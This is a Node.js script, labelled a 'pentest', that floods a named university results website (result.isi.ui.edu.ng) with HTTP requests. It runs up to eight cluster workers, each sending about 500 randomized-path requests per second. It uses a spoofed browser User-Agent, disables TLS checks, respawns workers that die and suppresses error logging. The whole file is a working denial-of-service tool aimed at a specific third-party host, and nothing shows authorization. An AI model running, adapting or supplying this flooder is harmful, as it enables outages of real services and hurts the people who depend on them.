const cluster = require('cluster');
const https = require('https');
const os = require('os');
const http = require('http'); // Fallback for http targets

// 🔧 RENDER-FREE OPTIMIZED CONFIG
const TARGET_HOST = 'result.isi.ui.edu.ng';
const TARGET_PATH = '/'; // Base path - randomize below
const MAX_RPS_PER_WORKER = 500;  // Safe for 0.1 CPU (total ~2-4k rps w/ 8 workers)
const THREADS = Math.min(os.cpus().length, 8); // Cap at 8 for free tier
const BURST_SIZE = 100;  // Requests per burst (TCP friendly)
const BURST_INTERVAL = 200;  // ms between bursts (~500 rps/worker)

console.log(`🚀 RENDER-FREE PENTEST: ${MAX_RPS_PER_WORKER * THREADS} target RPS x ${THREADS} workers`);
console.log(`📊 Target: https://${TARGET_HOST}${TARGET_PATH}`);

if (cluster.isMaster) {
    console.log('Master spawning workers...');
    for (let i = 0; i < THREADS; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died - respawning`);
        cluster.fork();
    });

    // Graceful shutdown
    process.on('SIGTERM', () => {
        console.log('Master shutdown');
        process.exit(0);
    });
} else {
    // Worker config - Render optimized
    const parsed = new URL(`https://${TARGET_HOST}`);
    const isHttps = parsed.protocol === 'https:';
    const Client = isHttps ? https : http;

    const agent = new Client.Agent({
        keepAlive: true,
        maxSockets: 200,        // Reduced for free tier
        maxFreeSockets: 50,
        timeout: 5000,          // Fail fast
        rejectUnauthorized: false
    });

    let totalRequests = 0;
    let errors = 0;
    let lastReport = Date.now();

    const makeRequest = () => {
        const randomPath = TARGET_PATH + Math.random().toString(36).substring(7);
        const req = Client.request({
            hostname: TARGET_HOST,
            port: parsed.port || (isHttps ? 443 : 80),
            path: randomPath,
            method: 'GET',
            headers: {
                'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            },
            agent,
            timeout: 3000
        }, (res) => {
            totalRequests++;
            res.destroy(); // Don't buffer response
        });

        req.on('error', (err) => {
            errors++;
            // Silent fail - don't log every error
        });

        req.on('timeout', () => req.destroy());
        req.end();
    };

    // Controlled burst flooding
    const floodBurst = () => {
        for (let i = 0; i < BURST_SIZE; i++) {
            makeRequest();
        }
    };

    // Main loop: 500rps = 100req / 200ms
    const floodInterval = setInterval(floodBurst, BURST_INTERVAL);

    // Stats every 30s
    setInterval(() => {
        const now = Date.now();
        const rps = Math.round(totalRequests / ((now - lastReport) / 1000));
        console.log(`Worker ${process.pid}: ${totalRequests.toLocaleString()} req | ${rps} rps | ${errors} errs`);
        lastReport = now;
    }, 30000);

    // Worker shutdown
    process.on('SIGTERM', () => {
        clearInterval(floodInterval);
        console.log(`Worker ${process.pid} shutdown: ${totalRequests.toLocaleString()} total`);
        process.exit(0);
    });
}